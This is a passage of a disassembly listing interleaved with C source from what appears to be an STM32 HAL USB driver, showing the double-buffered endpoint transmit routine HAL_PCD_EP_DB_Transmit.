 8003084:	881b      	ldrh	r3, [r3, #0]
 8003086:	b29b      	uxth	r3, r3
 8003088:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800308c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003090:	b29a      	uxth	r2, r3
 8003092:	69bb      	ldr	r3, [r7, #24]
 8003094:	801a      	strh	r2, [r3, #0]
 8003096:	e017      	b.n	80030c8 <HAL_PCD_EP_DB_Transmit+0x186>
 8003098:	68bb      	ldr	r3, [r7, #8]
 800309a:	785b      	ldrb	r3, [r3, #1]
 800309c:	2b01      	cmp	r3, #1
 800309e:	d113      	bne.n	80030c8 <HAL_PCD_EP_DB_Transmit+0x186>
 80030a0:	68fb      	ldr	r3, [r7, #12]
 80030a2:	681b      	ldr	r3, [r3, #0]
 80030a4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80030a8:	b29b      	uxth	r3, r3
 80030aa:	461a      	mov	r2, r3
 80030ac:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80030ae:	4413      	add	r3, r2
 80030b0:	627b      	str	r3, [r7, #36]	; 0x24
 80030b2:	68bb      	ldr	r3, [r7, #8]
 80030b4:	781b      	ldrb	r3, [r3, #0]
 80030b6:	00da      	lsls	r2, r3, #3
 80030b8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80030ba:	4413      	add	r3, r2
 80030bc:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80030c0:	623b      	str	r3, [r7, #32]
 80030c2:	6a3b      	ldr	r3, [r7, #32]
 80030c4:	2200      	movs	r2, #0
 80030c6:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 80030c8:	68bb      	ldr	r3, [r7, #8]
 80030ca:	781b      	ldrb	r3, [r3, #0]
 80030cc:	4619      	mov	r1, r3
 80030ce:	68f8      	ldr	r0, [r7, #12]
 80030d0:	f009 fc49 	bl	800c966 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 80030d4:	88fb      	ldrh	r3, [r7, #6]
 80030d6:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80030da:	2b00      	cmp	r3, #0
 80030dc:	f000 82fa 	beq.w	80036d4 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 80030e0:	68fb      	ldr	r3, [r7, #12]
 80030e2:	681b      	ldr	r3, [r3, #0]
 80030e4:	461a      	mov	r2, r3
 80030e6:	68bb      	ldr	r3, [r7, #8]
 80030e8:	781b      	ldrb	r3, [r3, #0]
 80030ea:	009b      	lsls	r3, r3, #2
 80030ec:	4413      	add	r3, r2
 80030ee:	881b      	ldrh	r3, [r3, #0]
 80030f0:	b29b      	uxth	r3, r3
 80030f2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80030f6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80030fa:	82fb      	strh	r3, [r7, #22]
 80030fc:	68fb      	ldr	r3, [r7, #12]
 80030fe:	681b      	ldr	r3, [r3, #0]
 8003100:	461a      	mov	r2, r3
 8003102:	68bb      	ldr	r3, [r7, #8]
 8003104:	781b      	ldrb	r3, [r3, #0]
 8003106:	009b      	lsls	r3, r3, #2
 8003108:	441a      	add	r2, r3
 800310a:	8afb      	ldrh	r3, [r7, #22]
 800310c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003110:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003114:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003118:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800311c:	b29b      	uxth	r3, r3
 800311e:	8013      	strh	r3, [r2, #0]
 8003120:	e2d8      	b.n	80036d4 <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8003122:	88fb      	ldrh	r3, [r7, #6]
 8003124:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8003128:	2b00      	cmp	r3, #0
 800312a:	d021      	beq.n	8003170 <HAL_PCD_EP_DB_Transmit+0x22e>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 800312c:	68fb      	ldr	r3, [r7, #12]
 800312e:	681b      	ldr	r3, [r3, #0]
 8003130:	461a      	mov	r2, r3
 8003132:	68bb      	ldr	r3, [r7, #8]
 8003134:	781b      	ldrb	r3, [r3, #0]
 8003136:	009b      	lsls	r3, r3, #2
 8003138:	4413      	add	r3, r2
 800313a:	881b      	ldrh	r3, [r3, #0]
 800313c:	b29b      	uxth	r3, r3
 800313e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8003142:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8003146:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 800314a:	68fb      	ldr	r3, [r7, #12]
 800314c:	681b      	ldr	r3, [r3, #0]
 800314e:	461a      	mov	r2, r3
 8003150:	68bb      	ldr	r3, [r7, #8]
 8003152:	781b      	ldrb	r3, [r3, #0]
 8003154:	009b      	lsls	r3, r3, #2
 8003156:	441a      	add	r2, r3
 8003158:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 800315c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003160:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003164:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003168:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800316c:	b29b      	uxth	r3, r3
 800316e:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 8003170:	68bb      	ldr	r3, [r7, #8]
 8003172:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 8003176:	2b01      	cmp	r3, #1
 8003178:	f040 82ac 	bne.w	80036d4 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 800317c:	68bb      	ldr	r3, [r7, #8]
 800317e:	695a      	ldr	r2, [r3, #20]
 8003180:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003184:	441a      	add	r2, r3
 8003186:	68bb      	ldr	r3, [r7, #8]
 8003188:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 800318a:	68bb      	ldr	r3, [r7, #8]
 800318c:	69da      	ldr	r2, [r3, #28]
 800318e:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003192:	441a      	add	r2, r3
 8003194:	68bb      	ldr	r3, [r7, #8]
 8003196:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 8003198:	68bb      	ldr	r3, [r7, #8]
 800319a:	6a1a      	ldr	r2, [r3, #32]
 800319c:	68bb      	ldr	r3, [r7, #8]
 800319e:	691b      	ldr	r3, [r3, #16]
 80031a0:	429a      	cmp	r2, r3
 80031a2:	d30b      	bcc.n	80031bc <HAL_PCD_EP_DB_Transmit+0x27a>
        {
          len = ep->maxpacket;
 80031a4:	68bb      	ldr	r3, [r7, #8]
 80031a6:	691b      	ldr	r3, [r3, #16]
 80031a8:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 80031ac:	68bb      	ldr	r3, [r7, #8]
 80031ae:	6a1a      	ldr	r2, [r3, #32]
 80031b0:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80031b4:	1ad2      	subs	r2, r2, r3
 80031b6:	68bb      	ldr	r3, [r7, #8]
 80031b8:	621a      	str	r2, [r3, #32]
 80031ba:	e017      	b.n	80031ec <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else if (ep->xfer_len_db == 0U)
 80031bc:	68bb      	ldr	r3, [r7, #8]
 80031be:	6a1b      	ldr	r3, [r3, #32]
 80031c0:	2b00      	cmp	r3, #0
 80031c2:	d108      	bne.n	80031d6 <HAL_PCD_EP_DB_Transmit+0x294>
        {
          len = TxPctSize;
 80031c4:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80031c8:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 80031cc:	68bb      	ldr	r3, [r7, #8]
 80031ce:	2200      	movs	r2, #0
 80031d0:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 80031d4:	e00a      	b.n	80031ec <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else
        {
          ep->xfer_fill_db = 0U;
 80031d6:	68bb      	ldr	r3, [r7, #8]
 80031d8:	2200      	movs	r2, #0
 80031da:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
          len = ep->xfer_len_db;
 80031de:	68bb      	ldr	r3, [r7, #8]
 80031e0:	6a1b      	ldr	r3, [r3, #32]
 80031e2:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 80031e6:	68bb      	ldr	r3, [r7, #8]
 80031e8:	2200      	movs	r2, #0
 80031ea:	621a      	str	r2, [r3, #32]
        }

        /* Write remaining Data to Buffer */
        /* Set the Double buffer counter for pma buffer1 */
        PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 80031ec:	68bb      	ldr	r3, [r7, #8]
 80031ee:	785b      	ldrb	r3, [r3, #1]
 80031f0:	2b00      	cmp	r3, #0
 80031f2:	d165      	bne.n	80032c0 <HAL_PCD_EP_DB_Transmit+0x37e>
 80031f4:	68fb      	ldr	r3, [r7, #12]
 80031f6:	681b      	ldr	r3, [r3, #0]
 80031f8:	63fb      	str	r3, [r7, #60]	; 0x3c
 80031fa:	68fb      	ldr	r3, [r7, #12]
 80031fc:	681b      	ldr	r3, [r3, #0]
 80031fe:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003202:	b29b      	uxth	r3, r3
 8003204:	461a      	mov	r2, r3
 8003206:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8003208:	4413      	add	r3, r2
 800320a:	63fb      	str	r3, [r7, #60]	; 0x3c
 800320c:	68bb      	ldr	r3, [r7, #8]
 800320e:	781b      	ldrb	r3, [r3, #0]
 8003210:	00da      	lsls	r2, r3, #3
 8003212:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8003214:	4413      	add	r3, r2
 8003216:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800321a:	63bb      	str	r3, [r7, #56]	; 0x38
 800321c:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800321e:	881b      	ldrh	r3, [r3, #0]
 8003220:	b29b      	uxth	r3, r3
 8003222:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003226:	b29a      	uxth	r2, r3
 8003228:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800322a:	801a      	strh	r2, [r3, #0]
 800322c:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003230:	2b3e      	cmp	r3, #62	; 0x3e
 8003232:	d91d      	bls.n	8003270 <HAL_PCD_EP_DB_Transmit+0x32e>
 8003234:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003238:	095b      	lsrs	r3, r3, #5
 800323a:	64bb      	str	r3, [r7, #72]	; 0x48
 800323c:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003240:	f003 031f 	and.w	r3, r3, #31
 8003244:	2b00      	cmp	r3, #0
 8003246:	d102      	bne.n	800324e <HAL_PCD_EP_DB_Transmit+0x30c>
 8003248:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 800324a:	3b01      	subs	r3, #1
 800324c:	64bb      	str	r3, [r7, #72]	; 0x48
 800324e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003250:	881b      	ldrh	r3, [r3, #0]
 8003252:	b29a      	uxth	r2, r3
 8003254:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8003256:	b29b      	uxth	r3, r3
 8003258:	029b      	lsls	r3, r3, #10
 800325a:	b29b      	uxth	r3, r3
 800325c:	4313      	orrs	r3, r2
 800325e:	b29b      	uxth	r3, r3
 8003260:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003264:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003268:	b29a      	uxth	r2, r3
 800326a:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800326c:	801a      	strh	r2, [r3, #0]
 800326e:	e044      	b.n	80032fa <HAL_PCD_EP_DB_Transmit+0x3b8>
 8003270:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003274:	2b00      	cmp	r3, #0
 8003276:	d10a      	bne.n	800328e <HAL_PCD_EP_DB_Transmit+0x34c>
 8003278:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800327a:	881b      	ldrh	r3, [r3, #0]
 800327c:	b29b      	uxth	r3, r3
 800327e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003282:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003286:	b29a      	uxth	r2, r3
 8003288:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800328a:	801a      	strh	r2, [r3, #0]
 800328c:	e035      	b.n	80032fa <HAL_PCD_EP_DB_Transmit+0x3b8>
 800328e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003292:	085b      	lsrs	r3, r3, #1
 8003294:	64bb      	str	r3, [r7, #72]	; 0x48
 8003296:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800329a:	f003 0301 	and.w	r3, r3, #1
 800329e:	2b00      	cmp	r3, #0
 80032a0:	d002      	beq.n	80032a8 <HAL_PCD_EP_DB_Transmit+0x366>
 80032a2:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80032a4:	3301      	adds	r3, #1
 80032a6:	64bb      	str	r3, [r7, #72]	; 0x48
 80032a8:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80032aa:	881b      	ldrh	r3, [r3, #0]
 80032ac:	b29a      	uxth	r2, r3
 80032ae:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80032b0:	b29b      	uxth	r3, r3
 80032b2:	029b      	lsls	r3, r3, #10
 80032b4:	b29b      	uxth	r3, r3
 80032b6:	4313      	orrs	r3, r2
 80032b8:	b29a      	uxth	r2, r3
 80032ba:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80032bc:	801a      	strh	r2, [r3, #0]
 80032be:	e01c      	b.n	80032fa <HAL_PCD_EP_DB_Transmit+0x3b8>
 80032c0:	68bb      	ldr	r3, [r7, #8]
 80032c2:	785b      	ldrb	r3, [r3, #1]
 80032c4:	2b01      	cmp	r3, #1
 80032c6:	d118      	bne.n	80032fa <HAL_PCD_EP_DB_Transmit+0x3b8>
 80032c8:	68fb      	ldr	r3, [r7, #12]
 80032ca:	681b      	ldr	r3, [r3, #0]
 80032cc:	647b      	str	r3, [r7, #68]	; 0x44
 80032ce:	68fb      	ldr	r3, [r7, #12]
 80032d0:	681b      	ldr	r3, [r3, #0]
 80032d2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80032d6:	b29b      	uxth	r3, r3
 80032d8:	461a      	mov	r2, r3
 80032da:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80032dc:	4413      	add	r3, r2
 80032de:	647b      	str	r3, [r7, #68]	; 0x44
 80032e0:	68bb      	ldr	r3, [r7, #8]
 80032e2:	781b      	ldrb	r3, [r3, #0]
 80032e4:	00da      	lsls	r2, r3, #3
 80032e6:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80032e8:	4413      	add	r3, r2
 80032ea:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80032ee:	643b      	str	r3, [r7, #64]	; 0x40
 80032f0:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80032f4:	b29a      	uxth	r2, r3
 80032f6:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 80032f8:	801a      	strh	r2, [r3, #0]

        /* Copy user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr0, (uint16_t)len);
 80032fa:	68fb      	ldr	r3, [r7, #12]
 80032fc:	6818      	ldr	r0, [r3, #0]
 80032fe:	68bb      	ldr	r3, [r7, #8]
 8003300:	6959      	ldr	r1, [r3, #20]
 8003302:	68bb      	ldr	r3, [r7, #8]
 8003304:	891a      	ldrh	r2, [r3, #8]
 8003306:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800330a:	b29b      	uxth	r3, r3
 800330c:	f005 f8c9 	bl	80084a2 <USB_WritePMA>
 8003310:	e1e0      	b.n	80036d4 <HAL_PCD_EP_DB_Transmit+0x792>
    }
  }
  else /* Data Buffer1 ACK received */
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8003312:	68fb      	ldr	r3, [r7, #12]
 8003314:	681b      	ldr	r3, [r3, #0]
 8003316:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800331a:	b29b      	uxth	r3, r3
 800331c:	461a      	mov	r2, r3
 800331e:	68bb      	ldr	r3, [r7, #8]
 8003320:	781b      	ldrb	r3, [r3, #0]
 8003322:	00db      	lsls	r3, r3, #3
 8003324:	4413      	add	r3, r2
 8003326:	68fa      	ldr	r2, [r7, #12]
 8003328:	6812      	ldr	r2, [r2, #0]
 800332a:	4413      	add	r3, r2
 800332c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003330:	881b      	ldrh	r3, [r3, #0]
 8003332:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003336:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len >= TxPctSize)
 800333a:	68bb      	ldr	r3, [r7, #8]
 800333c:	699a      	ldr	r2, [r3, #24]
 800333e:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003342:	429a      	cmp	r2, r3
 8003344:	d307      	bcc.n	8003356 <HAL_PCD_EP_DB_Transmit+0x414>
    {
      ep->xfer_len -= TxPctSize;
 8003346:	68bb      	ldr	r3, [r7, #8]
 8003348:	699a      	ldr	r2, [r3, #24]
 800334a:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 800334e:	1ad2      	subs	r2, r2, r3
 8003350:	68bb      	ldr	r3, [r7, #8]
 8003352:	619a      	str	r2, [r3, #24]
 8003354:	e002      	b.n	800335c <HAL_PCD_EP_DB_Transmit+0x41a>
    }
    else
    {
      ep->xfer_len = 0U;
 8003356:	68bb      	ldr	r3, [r7, #8]
 8003358:	2200      	movs	r2, #0
 800335a:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 800335c:	68bb      	ldr	r3, [r7, #8]
 800335e:	699b      	ldr	r3, [r3, #24]
 8003360:	2b00      	cmp	r3, #0
 8003362:	f040 80c0 	bne.w	80034e6 <HAL_PCD_EP_DB_Transmit+0x5a4>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8003366:	68bb      	ldr	r3, [r7, #8]
 8003368:	785b      	ldrb	r3, [r3, #1]
 800336a:	2b00      	cmp	r3, #0
 800336c:	d126      	bne.n	80033bc <HAL_PCD_EP_DB_Transmit+0x47a>
 800336e:	68fb      	ldr	r3, [r7, #12]
 8003370:	681b      	ldr	r3, [r3, #0]
 8003372:	67fb      	str	r3, [r7, #124]	; 0x7c
 8003374:	68fb      	ldr	r3, [r7, #12]
 8003376:	681b      	ldr	r3, [r3, #0]
 8003378:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800337c:	b29b      	uxth	r3, r3
 800337e:	461a      	mov	r2, r3
 8003380:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 8003382:	4413      	add	r3, r2
 8003384:	67fb      	str	r3, [r7, #124]	; 0x7c
 8003386:	68bb      	ldr	r3, [r7, #8]
 8003388:	781b      	ldrb	r3, [r3, #0]
 800338a:	00da      	lsls	r2, r3, #3
 800338c:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 800338e:	4413      	add	r3, r2
 8003390:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003394:	67bb      	str	r3, [r7, #120]	; 0x78
 8003396:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003398:	881b      	ldrh	r3, [r3, #0]
 800339a:	b29b      	uxth	r3, r3
 800339c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80033a0:	b29a      	uxth	r2, r3
 80033a2:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80033a4:	801a      	strh	r2, [r3, #0]
 80033a6:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80033a8:	881b      	ldrh	r3, [r3, #0]
 80033aa:	b29b      	uxth	r3, r3
 80033ac:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80033b0:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80033b4:	b29a      	uxth	r2, r3
 80033b6:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80033b8:	801a      	strh	r2, [r3, #0]
 80033ba:	e01a      	b.n	80033f2 <HAL_PCD_EP_DB_Transmit+0x4b0>
 80033bc:	68bb      	ldr	r3, [r7, #8]
 80033be:	785b      	ldrb	r3, [r3, #1]
 80033c0:	2b01      	cmp	r3, #1
 80033c2:	d116      	bne.n	80033f2 <HAL_PCD_EP_DB_Transmit+0x4b0>
 80033c4:	68fb      	ldr	r3, [r7, #12]
 80033c6:	681b      	ldr	r3, [r3, #0]
 80033c8:	667b      	str	r3, [r7, #100]	; 0x64
 80033ca:	68fb      	ldr	r3, [r7, #12]
 80033cc:	681b      	ldr	r3, [r3, #0]
 80033ce:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80033d2:	b29b      	uxth	r3, r3
 80033d4:	461a      	mov	r2, r3
 80033d6:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80033d8:	4413      	add	r3, r2
 80033da:	667b      	str	r3, [r7, #100]	; 0x64
 80033dc:	68bb      	ldr	r3, [r7, #8]
 80033de:	781b      	ldrb	r3, [r3, #0]
 80033e0:	00da      	lsls	r2, r3, #3
 80033e2:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80033e4:	4413      	add	r3, r2
 80033e6:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80033ea:	663b      	str	r3, [r7, #96]	; 0x60
 80033ec:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 80033ee:	2200      	movs	r2, #0
 80033f0:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 80033f2:	68fb      	ldr	r3, [r7, #12]
 80033f4:	681b      	ldr	r3, [r3, #0]
 80033f6:	677b      	str	r3, [r7, #116]	; 0x74
 80033f8:	68bb      	ldr	r3, [r7, #8]
 80033fa:	785b      	ldrb	r3, [r3, #1]
 80033fc:	2b00      	cmp	r3, #0
 80033fe:	d12b      	bne.n	8003458 <HAL_PCD_EP_DB_Transmit+0x516>
 8003400:	68fb      	ldr	r3, [r7, #12]
 8003402:	681b      	ldr	r3, [r3, #0]
 8003404:	66fb      	str	r3, [r7, #108]	; 0x6c
 8003406:	68fb      	ldr	r3, [r7, #12]
 8003408:	681b      	ldr	r3, [r3, #0]
 800340a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800340e:	b29b      	uxth	r3, r3
 8003410:	461a      	mov	r2, r3
 8003412:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 8003414:	4413      	add	r3, r2
 8003416:	66fb      	str	r3, [r7, #108]	; 0x6c
 8003418:	68bb      	ldr	r3, [r7, #8]
 800341a:	781b      	ldrb	r3, [r3, #0]
 800341c:	00da      	lsls	r2, r3, #3
 800341e:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 8003420:	4413      	add	r3, r2
 8003422:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003426:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 800342a:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 800342e:	881b      	ldrh	r3, [r3, #0]
 8003430:	b29b      	uxth	r3, r3
 8003432:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003436:	b29a      	uxth	r2, r3
 8003438:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 800343c:	801a      	strh	r2, [r3, #0]
 800343e:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 8003442:	881b      	ldrh	r3, [r3, #0]
 8003444:	b29b      	uxth	r3, r3
 8003446:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800344a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800344e:	b29a      	uxth	r2, r3
 8003450:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 8003454:	801a      	strh	r2, [r3, #0]
 8003456:	e017      	b.n	8003488 <HAL_PCD_EP_DB_Transmit+0x546>
 8003458:	68bb      	ldr	r3, [r7, #8]
 800345a:	785b      	ldrb	r3, [r3, #1]
 800345c:	2b01      	cmp	r3, #1
 800345e:	d113      	bne.n	8003488 <HAL_PCD_EP_DB_Transmit+0x546>
 8003460:	68fb      	ldr	r3, [r7, #12]
 8003462:	681b      	ldr	r3, [r3, #0]
 8003464:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003468:	b29b      	uxth	r3, r3
 800346a:	461a      	mov	r2, r3
 800346c:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 800346e:	4413      	add	r3, r2
 8003470:	677b      	str	r3, [r7, #116]	; 0x74
 8003472:	68bb      	ldr	r3, [r7, #8]
 8003474:	781b      	ldrb	r3, [r3, #0]
 8003476:	00da      	lsls	r2, r3, #3
 8003478:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 800347a:	4413      	add	r3, r2
 800347c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003480:	673b      	str	r3, [r7, #112]	; 0x70
 8003482:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 8003484:	2200      	movs	r2, #0
 8003486:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8003488:	68bb      	ldr	r3, [r7, #8]
 800348a:	781b      	ldrb	r3, [r3, #0]
 800348c:	4619      	mov	r1, r3
 800348e:	68f8      	ldr	r0, [r7, #12]
 8003490:	f009 fa69 	bl	800c966 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 8003494:	88fb      	ldrh	r3, [r7, #6]
 8003496:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800349a:	2b00      	cmp	r3, #0
 800349c:	f040 811a 	bne.w	80036d4 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 80034a0:	68fb      	ldr	r3, [r7, #12]
 80034a2:	681b      	ldr	r3, [r3, #0]
 80034a4:	461a      	mov	r2, r3
 80034a6:	68bb      	ldr	r3, [r7, #8]
 80034a8:	781b      	ldrb	r3, [r3, #0]
 80034aa:	009b      	lsls	r3, r3, #2
 80034ac:	4413      	add	r3, r2
 80034ae:	881b      	ldrh	r3, [r3, #0]
 80034b0:	b29b      	uxth	r3, r3
 80034b2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80034b6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80034ba:	f8a7 3088 	strh.w	r3, [r7, #136]	; 0x88
 80034be:	68fb      	ldr	r3, [r7, #12]
 80034c0:	681b      	ldr	r3, [r3, #0]
 80034c2:	461a      	mov	r2, r3
 80034c4:	68bb      	ldr	r3, [r7, #8]
 80034c6:	781b      	ldrb	r3, [r3, #0]
 80034c8:	009b      	lsls	r3, r3, #2
 80034ca:	441a      	add	r2, r3
 80034cc:	f8b7 3088 	ldrh.w	r3, [r7, #136]	; 0x88
 80034d0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80034d4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80034d8:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80034dc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80034e0:	b29b      	uxth	r3, r3
 80034e2:	8013      	strh	r3, [r2, #0]
 80034e4:	e0f6      	b.n	80036d4 <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 80034e6:	88fb      	ldrh	r3, [r7, #6]
 80034e8:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80034ec:	2b00      	cmp	r3, #0
 80034ee:	d121      	bne.n	8003534 <HAL_PCD_EP_DB_Transmit+0x5f2>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 80034f0:	68fb      	ldr	r3, [r7, #12]
 80034f2:	681b      	ldr	r3, [r3, #0]
 80034f4:	461a      	mov	r2, r3
